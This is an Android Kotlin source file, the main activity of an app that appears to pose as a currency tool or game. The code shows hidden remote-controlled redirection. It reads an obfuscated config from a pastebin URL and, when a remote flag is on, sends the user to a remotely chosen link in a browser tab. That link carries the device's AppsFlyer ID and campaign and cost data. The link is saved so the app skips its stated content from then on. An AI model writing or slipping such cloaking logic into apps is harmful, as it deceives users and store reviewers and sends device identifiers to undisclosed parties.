package rateflow.procurrency.exchelonmaster

import android.app.PendingIntent
import android.content.Intent
import android.content.pm.ActivityInfo
import android.net.Uri
import android.os.Bundle
import android.widget.RemoteViews
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.appsflyer.AppsFlyerLib
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import rateflow.procurrency.exchelonmaster.databinding.ActivityMainBinding
import rateflow.procurrency.exchelonmaster.util.AppsflyerUtil
import rateflow.procurrency.exchelonmaster.util.DataStoreManager
import rateflow.procurrency.exchelonmaster.util.Lottie
import rateflow.procurrency.exchelonmaster.util.Once
import rateflow.procurrency.exchelonmaster.util.internetConnection
import rateflow.procurrency.exchelonmaster.util.log
import java.io.IOException
import kotlin.system.exitProcess


class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val W_ID = 1500

        val sID = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
        var webURL              = "https://www.google.com/"

        val eventFlow = MutableStateFlow(EnumEvent.DEFAULT)
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding      : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie: Lottie

    val okHttpClient = OkHttpClient()

    private var isPrivacy = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()
        if (internetConnection().not()) lottie.showNotInternet()
        else {
            asyncCheckInternetConnection()
            lottie.showLoader()

            coroutine.launch(Dispatchers.IO) {

                checkDataStore()
                launch {
                    eventFlow.collect {
                        when(it) {
                            EnumEvent.CANCEL -> exit()
                            EnumEvent.APPLY  -> saveAndOpenGame()
                            EnumEvent.DEFAULT -> {}
                        }
                    }
                }
                launch(Dispatchers.Main) {
                    sID.collect { fragmentId ->
                        when (fragmentId) {
                            R.id.libGDXFragment -> {
                                setNavigationBarColor(R.color.black)
                                setStartDestination(fragmentId)
                                ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                            }

                            W_ID -> {
                                val actionIntent          = Intent(applicationContext, BottomToolbarBroadcastReceiver::class.java)
                                val pendingIntent         = PendingIntent.getBroadcast(applicationContext,0, actionIntent, PendingIntent.FLAG_MUTABLE)
                                val secondaryToolbarViews = RemoteViews(packageName, R.layout.custom_tab_toolbar)
                                val clickableIds          = intArrayOf(R.id.ct_toolbar_next, R.id.ct_toolbar_previous)

                                val intent: CustomTabsIntent = if (isPrivacy) {
                                    CustomTabsIntent.Builder()
                                        .setSecondaryToolbarViews(secondaryToolbarViews, clickableIds, pendingIntent)
                                        .build()
                                } else CustomTabsIntent.Builder().build()

                                intent.launchUrl(this@MainActivity, Uri.parse(webURL))

                                setNavigationBarColor(R.color.white)
                                ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                            }

                            else                -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }.also { requestedOrientation = it }
                    }
                }
            }
        }
    }

    fun restart() {
        val intent = Intent(this, this::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
        startActivity(intent)
        Runtime.getRuntime().exit(0)
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = Lottie(binding)
    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    private fun asyncCheckInternetConnection() {
        coroutine.launch(Dispatchers.Main) {
            while (isActive) {
                delay(3_000)
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
            }
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    private fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

    private fun checkDataStore() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "Puknul" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = SUCCESS | link = $it")
                        webURL = it
                        sID.emit(W_ID)
                    }
                }
                "Igra" -> {
                    log("DataStoreManager Key = GAME")
                    sID.emit(R.id.libGDXFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    getFlag()
                }
            }
        }
    }

    private suspend fun getFlag() {
        val request: Request = Request.Builder().url("https://pastebin.com/raw/b8XNz1ce").build()

        try {
            okHttpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val json = JSONObject(response.body?.string() ?: "")
                    log("getFlag SUCCESS: $json")

                    val flag      = json.getBoolean("MonoSerif")
                    val key       = json.getString("Helzelli")
                    val privacy   = json.getString("pribaltiku")
                    val linkCheck = json.getString("nada")
                    val link      = json.getString("zabrat")

                    if (flag) getResponseFromServer(linkCheck, key, link)
                    else {
                        isPrivacy = true
                        webURL    = privacy
                        sID.tryEmit(W_ID)
                    }
                } else {
                    log("getFlag newCall FAIL: ${response.code} ${response.message}")
                    sID.tryEmit(R.id.libGDXFragment)
                }
            }
        } catch (e: IOException) {
            log("getFlag FAIL: $e")
            sID.tryEmit(R.id.libGDXFragment)
        }
    }

    private fun getResponseFromServer(linkCheck: String, key: String, link: String) {
        val request: Request = Request.Builder().url(linkCheck).build()

        try {
            okHttpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    log("getResponseFromServer SUCCESS code = ${response.code}")
                    generateAndOpenLink(key, link)
                } else {
                    log("getResponseFromServer newCall FAIL: ${response.code} ${response.message}")
                    sID.tryEmit(R.id.libGDXFragment)
                }
            }
        } catch (e: IOException) {
            log("getResponseFromServer FAIL: $e")
            sID.tryEmit(R.id.libGDXFragment)
        }
    }

    private fun generateAndOpenLink(key: String, target: String) {
        coroutine.launch(Dispatchers.IO) {
            val completerFlow = MutableSharedFlow<Unit>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)

            launch {
                AppsflyerUtil.initialize(this@MainActivity, key)
                AppsflyerUtil.checkFlow.collect { completerFlow.tryEmit(Unit) }
            }

            var counter = 0
            completerFlow.collect { if (++counter == 1) {
                val fullLink = target.plus("?") +
                        "sub1=".plus(AppsflyerUtil.campaignSubMap["sub1"].toString()).plus("&") +
                        "sub2=".plus(AppsflyerUtil.campaignSubMap["sub2"].toString()).plus("&") +
                        "sub3=".plus(AppsflyerUtil.campaignSubMap["sub3"].toString()).plus("&") +
                        "sub4=".plus(AppsflyerUtil.campaignSubMap["sub4"].toString()).plus("&") +
                        "sub5=".plus(AppsflyerUtil.campaignSubMap["sub5"].toString()).plus("&") +
                        "sub6=".plus(AppsflyerUtil.campaignSubMap["sub6"].toString()).plus("&") +
                        "sub_id_8=" .plus(AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)).plus("&") +
                        "sub_id_9=" .plus(AppsflyerUtil.dataMap["orig_cost"]     .toString()).plus("&") +
                        "sub_id_10=".plus(AppsflyerUtil.dataMap["cost_cents_USD"].toString()).plus("&") +
                        "sub_id_11=".plus(AppsflyerUtil.dataMap["media_source"]  .toString()).plus("&") +
                        "sub_id_12=".plus(appContext.packageName)

                log("full: $fullLink")

                webURL = fullLink
                sID.tryEmit(W_ID)

                withContext(Dispatchers.IO) {
                    DataStoreManager.Key.update { "Puknul" }
                    DataStoreManager.Link.update { fullLink }
                }
            } }
        }
    }

    private fun saveAndOpenGame() {
        coroutine.launch(Dispatchers.IO) {
            DataStoreManager.Key.update { "Igra" }

            withContext(Dispatchers.Main) {
                restart()
            }
        }

    }

}